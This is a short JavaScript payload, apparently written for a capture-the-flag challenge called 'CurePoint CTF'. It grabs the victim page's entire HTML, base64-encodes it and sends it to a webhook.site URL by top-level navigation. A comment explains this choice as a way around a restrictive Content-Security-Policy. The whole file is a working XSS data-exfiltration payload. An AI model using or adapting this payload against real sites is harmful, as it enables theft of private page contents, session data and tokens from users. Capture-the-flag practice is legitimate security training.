/* CurePoint CTF — load only from https://cdn.jsdelivr.net/gh/YOUR_USER/YOUR_REPO@main/exfil.js
 * CSP: connect-src inherits default-src 'none' → use top navigation to exfil DOM. */
(function () {
  var WH = "https://webhook.site/af75be10-0cbe-4fc8-843e-2dc8c15d14ed";
  var html = "";
  try {
    html = document.documentElement ? document.documentElement.outerHTML : "";
    if (html.length > 12000) html = html.slice(0, 12000);
  } catch (e) {
    html = String(e);
  }
  var q = "len=" + html.length + "&d=" + encodeURIComponent(btoa(unescape(encodeURIComponent(html))));
  window.location = WH + "?" + q;
})();
